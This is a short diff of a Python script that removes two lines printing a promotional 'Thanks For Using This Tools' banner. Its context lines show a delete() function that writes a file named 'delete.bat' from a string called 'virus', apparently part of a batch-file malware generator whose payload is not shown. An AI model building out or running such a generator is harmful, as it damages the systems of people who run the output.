@@ -48,8 +48,6 @@ def shutdown():
         menu()
     else:
         exit()
-text = colored('Thanks For Using This Tools :3, dont forget follow my instagram @nathandeft' , 'white', attrs=['reverse', 'blink'])
-print (text)
 def delete():
     thangans = open ("delete.bat","w")
     virus = """
@@ -103,6 +101,3 @@ while 1:
         menu()
     else:
         exit()
-
-text = colored('Thanks For Using This Tools :3, dont forget follow my instagram @nathandeft' , 'white', attrs=['reverse', 'blink'])
-print (text)
